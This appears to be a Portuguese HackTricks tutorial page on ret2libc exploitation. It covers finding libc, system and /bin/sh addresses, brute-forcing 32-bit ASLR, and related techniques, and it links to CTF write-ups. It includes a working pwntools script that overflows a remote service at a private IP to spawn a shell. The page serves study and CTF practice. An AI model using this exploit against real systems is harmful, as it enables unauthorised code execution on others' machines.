# Ret2lib

{{#include ../../../../banners/hacktricks-training.md}}

## **Informações Básicas**

A essência do **Ret2Libc** é redirecionar o fluxo de execução de um programa vulnerável para uma função dentro de uma biblioteca compartilhada (por exemplo, **system**, **execve**, **strcpy**) em vez de executar shellcode fornecido pelo atacante na pilha. O atacante cria um payload que modifica o endereço de retorno na pilha para apontar para a função da biblioteca desejada, enquanto também organiza para que quaisquer argumentos necessários sejam configurados corretamente de acordo com a convenção de chamada.

### **Exemplo de Passos (simplificado)**

- Obter o endereço da função a ser chamada (por exemplo, system) e o comando a ser chamado (por exemplo, /bin/sh)
- Gerar uma cadeia ROP para passar o primeiro argumento apontando para a string do comando e o fluxo de execução para a função

## Encontrando os endereços

- Supondo que a `libc` utilizada seja a da máquina atual, você pode encontrar onde ela será carregada na memória com:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Se você quiser verificar se o ASLR está mudando o endereço da libc, você pode fazer:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Sabendo a libc utilizada, também é possível encontrar o deslocamento para a função `system` com:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Sabendo a libc utilizada, também é possível encontrar o deslocamento para a string `/bin/sh` com:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Usando gdb-peda / GEF

Sabendo a libc utilizada, também é possível usar Peda ou GEF para obter o endereço da função **system**, da função **exit** e da string **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Usando /proc/\<PID>/maps

Se o processo está criando **filhos** toda vez que você fala com ele (servidor de rede), tente **ler** esse arquivo (provavelmente você precisará ser root).

Aqui você pode encontrar **exatamente onde a libc está carregada** dentro do processo e **onde será carregada** para cada filho do processo.

![](<../../../../images/image (95).png>)

Neste caso, está carregada em **0xb75dc000** (Este será o endereço base da libc)

## Libc desconhecida

Pode ser possível que você **não saiba qual libc o binário está carregando** (porque pode estar localizado em um servidor onde você não tem acesso). Nesse caso, você poderia abusar da vulnerabilidade para **vazar alguns endereços e descobrir qual biblioteca libc** está sendo usada:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

E você pode encontrar um template do pwntools para isso em:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

## Contornando ASLR em 32 bits

Esses ataques de força bruta são **úteis apenas para sistemas de 32 bits**.

- Se o exploit for local, você pode tentar forçar o endereço base da libc (útil para sistemas de 32 bits):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Se você estiver atacando um servidor remoto, pode tentar **forçar a barra do endereço da função `libc` `usleep`**, passando como argumento 10 (por exemplo). Se em algum momento o **servidor levar 10s a mais para responder**, você encontrou o endereço dessa função.

## One Gadget

{{#ref}}
../../one-gadget.md
{{#endref}}

## Exemplo de Código x86 Ret2lib

Neste exemplo, a força bruta do ASLR está integrada no código e o binário vulnerável está localizado em um servidor remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Exemplo de Código

Verifique o exemplo em:

{{#ref}}
../rop-return-oriented-programing.md
{{#endref}}

## Ret-into-printf (ou puts)

Isso permite **vazar informações do processo** chamando `printf`/`puts` com alguns dados específicos colocados como argumento.

## Ret2printf

Isso basicamente significa abusar de um **Ret2lib para transformá-lo em uma vulnerabilidade de strings de formato `printf`** usando o `ret2lib` para chamar printf com os valores para explorá-lo (parece inútil, mas é possível):

{{#ref}}
../../format-strings/
{{#endref}}

## Outros Exemplos & referências

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, dado um vazamento para o endereço de uma função na libc, usando um gadget
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bits, ASLR habilitado, mas sem PIE, o primeiro passo é preencher um overflow até o byte 0x00 do canário para então chamar puts e vazá-lo. Com o canário, um gadget ROP é criado para chamar puts para vazar o endereço de puts do GOT e um gadget ROP para chamar `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR habilitado, sem canário, overflow de pilha na função principal de uma função filha. Gadget ROP para chamar puts para vazar o endereço de puts do GOT e então chamar um gadget.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 bits, sem pie, sem canário, sem relro, nx. Usa a função write para vazar o endereço de write (libc) e chama um gadget.

{{#include ../../../../banners/hacktricks-training.md}}
